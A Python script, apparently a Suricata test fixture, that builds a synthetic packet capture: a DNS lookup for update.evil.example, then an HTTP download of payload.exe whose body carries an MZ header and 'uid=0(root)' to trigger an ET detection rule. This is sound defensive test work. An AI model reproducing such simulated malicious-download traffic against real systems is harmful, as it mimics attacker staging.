"""A small synthetic packet capture with known content, for Suricata's tests.

A DNS query and answer for update.evil.example, then a full TCP session in which 10.0.0.5 downloads
http://update.evil.example/payload.exe from 203.0.113.80. The response carries "uid=0(root)", which ET Open's rule
2100498, GPL ATTACK_RESPONSE id check returned root, matches. Times start at 2024-05-14 12:00:00 UTC.
"""

import struct

T0 = 1715688000  # 2024-05-14 12:00:00 UTC
CLIENT, SERVER, RESOLVER = "10.0.0.5", "203.0.113.80", "10.0.0.1"
MAC_A, MAC_B = bytes.fromhex("020000000001"), bytes.fromhex("020000000002")


def ip(text):
    return bytes(int(x) for x in text.split("."))


def checksum(data):
    if len(data) % 2:
        data += b"\0"
    s = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def ipv4(src, dst, proto, payload, ident):
    header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), ident, 0x4000, 64, proto, 0, ip(src), ip(dst))
    header = header[:10] + struct.pack("!H", checksum(header)) + header[12:]
    return header + payload


def l4_checksum(src, dst, proto, segment):
    pseudo = ip(src) + ip(dst) + struct.pack("!BBH", 0, proto, len(segment))
    return checksum(pseudo + segment)


def udp(src, dst, sport, dport, data):
    seg = struct.pack("!HHHH", sport, dport, 8 + len(data), 0) + data
    return seg[:6] + struct.pack("!H", l4_checksum(src, dst, 17, seg)) + seg[8:]


def tcp(src, dst, sport, dport, seq, ack, flags, data=b""):
    seg = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 65535, 0, 0) + data
    return seg[:16] + struct.pack("!H", l4_checksum(src, dst, 6, seg)) + seg[18:]


def frame(src, dst, packet, mac_src=MAC_A, mac_dst=MAC_B):
    return mac_dst + mac_src + b"\x08\x00" + packet


def dns_name(name):
    return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"




def write_pcap(path) -> int:
    packets = []

    t = T0
    q = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + dns_name("update.evil.example") + struct.pack("!HH", 1, 1)
    packets.append((t, frame(CLIENT, RESOLVER, ipv4(CLIENT, RESOLVER, 17, udp(CLIENT, RESOLVER, 53000, 53, q), 1))))
    a = (struct.pack("!HHHHHH", 0x1234, 0x8180, 1, 1, 0, 0) + dns_name("update.evil.example") + struct.pack("!HH", 1, 1)
         + b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 300, 4) + ip(SERVER))
    packets.append((t + 0.01, frame(RESOLVER, CLIENT, ipv4(RESOLVER, CLIENT, 17, udp(RESOLVER, CLIENT, 53, 53000, a), 2),
                                    MAC_B, MAC_A)))
    SYN, ACK, PSH, FIN = 0x02, 0x10, 0x08, 0x01
    c, s = 1000, 5000
    req = (b"GET /payload.exe HTTP/1.1\r\nHost: update.evil.example\r\nUser-Agent: Mozilla/4.0 (compatible; Test)\r\n"
           b"Accept: */*\r\n\r\n")
    body = b"MZ" + b"\x90" * 100 + b"uid=0(root) gid=0(root)\n"   # a classic ET rule's content
    resp = (b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: " + str(len(body)).encode()
            + b"\r\n\r\n" + body)
    seq = [
        (CLIENT, SERVER, 49200, 80, c, 0, SYN, b""),
        (SERVER, CLIENT, 80, 49200, s, c + 1, SYN | ACK, b""),
        (CLIENT, SERVER, 49200, 80, c + 1, s + 1, ACK, b""),
        (CLIENT, SERVER, 49200, 80, c + 1, s + 1, PSH | ACK, req),
        (SERVER, CLIENT, 80, 49200, s + 1, c + 1 + len(req), ACK, b""),
        (SERVER, CLIENT, 80, 49200, s + 1, c + 1 + len(req), PSH | ACK, resp),
        (CLIENT, SERVER, 49200, 80, c + 1 + len(req), s + 1 + len(resp), ACK, b""),
        (CLIENT, SERVER, 49200, 80, c + 1 + len(req), s + 1 + len(resp), FIN | ACK, b""),
        (SERVER, CLIENT, 80, 49200, s + 1 + len(resp), c + 2 + len(req), FIN | ACK, b""),
        (CLIENT, SERVER, 49200, 80, c + 2 + len(req), s + 2 + len(resp), ACK, b""),
    ]
    for i, (src, dst, sp, dp, sq, ak, fl, data) in enumerate(seq):
        to_server = src == CLIENT
        packets.append((t + 1 + i * 0.05, frame(src, dst, ipv4(src, dst, 6, tcp(src, dst, sp, dp, sq, ak, fl, data), 10 + i),
                                               MAC_A if to_server else MAC_B, MAC_B if to_server else MAC_A)))

    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for ts, data in packets:
            f.write(struct.pack("<IIII", int(ts), round((ts % 1) * 1e6), len(data), len(data)) + data)
    return len(packets)
